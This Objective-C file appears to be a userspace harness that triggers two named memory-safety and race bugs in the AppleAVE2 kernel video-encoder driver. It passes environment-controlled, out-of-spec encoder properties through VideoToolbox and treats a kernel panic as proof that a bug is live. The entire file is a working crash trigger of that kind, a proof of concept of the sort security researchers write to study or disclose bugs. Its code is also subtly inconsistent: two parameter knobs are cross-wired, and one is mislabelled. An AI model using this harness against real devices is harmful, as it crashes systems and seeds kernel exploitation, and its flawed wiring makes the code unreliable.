/*
 * vt_probe.m — userspace trigger harness for the AppleAVE2 kernel driver
 * (CVE-2026-64747 buffer overflow / CVE-2026-84607 race, both fixed after our 26.4).
 *
 * The video encoder is reached from any app that encodes a frame, so the app-facing surface is
 * VideoToolbox. Apple's newer build added bounds checks around the encoder's DPB entry array
 * (m_saEntry) plus several int32-overflow guards; our 26.4 build has neither.
 *
 * Every knob is read from the environment, so we sweep parameters by relaunching the app
 * (ios launch <bundle> --env=VT_XXX=...) instead of rebuilding:
 *
 *   VT_W / VT_H          frame size              (default 128x128)
 *   VT_FRAMES            frames to submit        (default 3)
 *   VT_SLICES            "number of entries"     (default 0 = leave alone)
 *   VT_MODE              DPB mode                 (default -1 = leave alone)
 *   VT_POC               picture order count      (default -1 = leave alone)
 *   VT_IGNORE            IgnoreEncodingParamsOnNextFrame (0/1)
 *   VT_REORDER           AllowFrameReordering     (0/1, default 1)
 *   VT_REALTIME          RealTime                 (0/1, default 1)
 *   VT_KEY               MaxKeyFrameInterval      (default 1)
 *   VT_BITRATE           AverageBitRate           (default 500000)
 *   VT_SLOW              usleep between frames    (default 0)
 *   VT_KEEPALIVE         MaxNumberOfFramesToKeepAlive (default 0 = leave alone)
 *
 * A kernel panic / device reboot for a specific combination == the bug is live.
 */
#import <Foundation/Foundation.h>
#import <CoreVideo/CoreVideo.h>
#import <CoreMedia/CoreMedia.h>
#import <VideoToolbox/VTCompressionSession.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static int envi(const char *k, int dflt)
{
	const char *v = getenv(k);
	return (v && *v) ? atoi(v) : dflt;
}

static void logline(const char *fmt, ...)
{
	va_list ap;
	char buf[512];
	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	fputs(buf, stdout);
	fputc('\n', stdout);
	fflush(stdout);
}

static void enc_cb(void *refcon, void *srcFrameRefcon, OSStatus status,
                   VTEncodeInfoFlags flags, CMSampleBufferRef sampleBuffer)
{
	(void)refcon; (void)srcFrameRefcon; (void)flags; (void)sampleBuffer;
	logline("[vt] encode callback status=%d", (int)status);
}

int main(void)
{
	@autoreleasepool {
		int w = envi("VT_W", 128), h = envi("VT_H", 128);
		int frames = envi("VT_FRAMES", 3);
		int slices = envi("VT_SLICES", 0);
		int mode = envi("VT_MODE", -1);
		int poc = envi("VT_POC", -1);
		int ignore = envi("VT_IGNORE", 0);
		int reorder = envi("VT_REORDER", 1);
		int realtime = envi("VT_REALTIME", 1);
		int key = envi("VT_KEY", 1);
		int bitrate = envi("VT_BITRATE", 500000);
		int slow = envi("VT_SLOW", 0);
		int keepalive = envi("VT_KEEPALIVE", 0);

		logline("[vt] start w=%d h=%d frames=%d slices=%d mode=%d poc=%d ignore=%d reorder=%d realtime=%d key=%d bitrate=%d keepalive=%d",
		        w, h, frames, slices, mode, poc, ignore, reorder, realtime, key, bitrate, keepalive);

		CVPixelBufferRef pb = NULL;
		NSDictionary *pa = @{
			(__bridge id)kCVPixelBufferPixelFormatTypeKey : @(kCVPixelFormatType_420YpCbCr8BiPlanarFullRange),
			(__bridge id)kCVPixelBufferWidthKey : @(w),
			(__bridge id)kCVPixelBufferHeightKey : @(h),
			(__bridge id)kCVPixelBufferIOSurfacePropertiesKey : @{},
		};
		if (CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
		        (__bridge CFDictionaryRef)pa, &pb) != kCVReturnSuccess || !pb) {
			logline("[vt] pixelbuffer failed");
			return 1;
		}
		CVPixelBufferLockBaseAddress(pb, 0);
		memset(CVPixelBufferGetBaseAddressOfPlane(pb, 0), 0x80, (size_t)w * h);
		memset(CVPixelBufferGetBaseAddressOfPlane(pb, 1), 0x80, (size_t)(w / 2) * (h / 2));
		CVPixelBufferUnlockBaseAddress(pb, 0);

		NSMutableDictionary *spec = [NSMutableDictionary dictionary];
		spec[(__bridge id)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder] = @YES;
		spec[(__bridge id)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder] = @NO;

		NSMutableDictionary *props = [NSMutableDictionary dictionary];
		props[(__bridge id)kVTCompressionPropertyKey_ProfileLevel] = (__bridge id)kVTProfileLevel_H264_High_AutoLevel;
		props[(__bridge id)kVTCompressionPropertyKey_AverageBitRate] = @(bitrate);
		props[(__bridge id)kVTCompressionPropertyKey_AllowFrameReordering] = @(reorder ? YES : NO);
		props[(__bridge id)kVTCompressionPropertyKey_RealTime] = @(realtime ? YES : NO);
		props[(__bridge id)kVTCompressionPropertyKey_MaxKeyFrameInterval] = @(key);
		props[(__bridge id)kVTCompressionPropertyKey_MaxKeyFrameIntervalDuration] = @(1);
		props[(__bridge id)kVTCompressionPropertyKey_ExpectedFrameRate] = @(30);

		/* experimental knobs as raw string keys (VideoToolbox passes them through) */
		if (ignore)
			props[@"IgnoreEncodingParamsOnNextFrame"] = @YES;
		if (slices > 0)
			props[@"MaxNumberOfFramesToKeepAlive"] = @(slices);
		if (keepalive > 0)
			props[@"NumberOfSlices"] = @(keepalive);
		if (mode >= 0)
			props[@"DPBMode"] = @(mode);
		if (poc >= 0)
			props[@"ExpectedSourceFrameDisplayTimestamp"] = @(poc);
		if (slices > 0)
			props[@"NumberOfSlices"] = @(slices);

		VTCompressionSessionRef sess = NULL;
		OSStatus st = VTCompressionSessionCreate(NULL, w, h, kCMVideoCodecType_H264,
		        (__bridge CFDictionaryRef)spec, (__bridge CFDictionaryRef)props,
		        NULL, enc_cb, NULL, &sess);
		if (st != noErr || !sess) {
			logline("[vt] session create failed: %d", (int)st);
			return 2;
		}
		logline("[vt] session created");

		for (int i = 0; i < frames; i++) {
			CMTime pts = CMTimeMake(i, 30);
			CMTime dur = CMTimeMake(1, 30);
			st = VTCompressionSessionEncodeFrame(sess, pb, pts, dur, NULL, NULL);
			logline("[vt] submit frame %d -> %d", i, (int)st);
			if (slow) usleep(slow);
		}
		VTCompressionSessionCompleteFrames(sess, 0xffffffff);
		logline("[vt] done");
		VTCompressionSessionInvalidate(sess);
		CFRelease(sess);
	}
	return 0;
}
